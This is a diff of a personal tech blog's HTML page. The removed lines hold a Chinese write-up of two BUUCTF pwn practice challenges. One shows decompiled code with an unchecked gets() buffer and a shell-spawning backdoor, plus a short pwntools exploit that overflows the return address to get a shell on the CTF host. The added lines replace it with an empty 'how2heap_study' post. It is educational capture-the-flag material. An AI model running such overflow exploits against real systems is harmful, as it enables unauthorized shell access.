@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>haoo&#39;s tech blog - BUUCTF_pwn靶场练习</title>
-<meta name="description" content="test_your_ncint __fastcall main(int argc, const char **argv, const char **envp)&amp;#123; system(&amp;quot;/bin/sh&amp;quot;); return 0;&amp;#125; 一道简答的签到题目，直接nc连接就可以获得shell。 r">
+<title>haoo&#39;s tech blog - how2heap_study</title>
+<meta name="description" content="haoo的个人博客,用于记录相关学习笔记、技术文章、CTF writeup等">
 <meta name="theme-color" content="#090c0b">
 <meta name="color-scheme" content="dark">
 <script>
@@ -75,9 +75,9 @@
     <article class="article-wrap">
       <header class="article-header">
         <div class="post-meta">
-          <span>995 字</span>
+          <span>0 字</span>
         </div>
-        <h1>BUUCTF_pwn靶场练习</h1>
+        <h1>how2heap_study</h1>
         
           <div class="tag-list">
             
@@ -92,18 +92,7 @@
 
       <div class="article-grid">
         <div class="article-body article-prose" id="article-content">
-          <h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  system(&quot;/bin/sh&quot;);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>一道简答的签到题目，直接nc连接就可以获得shell。</p>
-<h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/ctf/buuctf/rip&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
-
-<p>一道64位的题目，几乎什么保护都没有开启，说明也是一道简单的签到题目，直接放入ida中进行分析</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  char s[15]; // [rsp+1h] [rbp-Fh] BYREF<br><br>  puts(&quot;please input&quot;);<br>  gets(s, argv);<br>  puts(s);<br>  puts(&quot;ok,bye!!!&quot;);<br>  return 0;<br>&#125;<br>int fun()<br>&#123;<br>  return system(&quot;/bin/sh&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>存在明显的栈溢出以及后门函数，因此这道题的思路就是利用栈溢出修改返回地址到后门函数的地址即可获得shell。由于是64位，需要注意堆栈平衡，exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io = remote(&quot;9a7dcd5303871c963154af4f.tcp-ctf2.dasctf.com&quot;, 9999, ssl=True)<br><br>ret = 0x0000000000401016<br>fun = 0x401186<br>payload = cyclic(0xF + 8) + p64(ret) + p64(fun)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
-
-
+          
         </div>
 
         
@@ -119,15 +108,15 @@
 
       <nav class="article-nav" aria-label="文章导航">
         
-          <a href="/ISCTF2025/">
+          <a href="/OWASP-IoTGoat-%E7%BB%83%E4%B9%A0/">
             <span>上一篇</span>
-            <strong>ISCTF2025</strong>
+            <strong>OWASP_IoTGoat_练习</strong>
           </a>
         
         
-          <a href="/NSSCTF-pwn%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+          <a href="/CodeForces-%E7%BB%83%E4%B9%A0/">
             <span>下一篇</span>
-            <strong>NSSCTF_pwn靶场练习</strong>
+            <strong>CodeForces_练习</strong>
           </a>
         
       </nav>
@@ -136,7 +125,7 @@
 
   <footer class="site-footer">
   <div class="site-footer__inner">
-    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>15 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>26 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
     <p>&copy; haoo · powered by Hexo</p>
   </div>
 </footer>
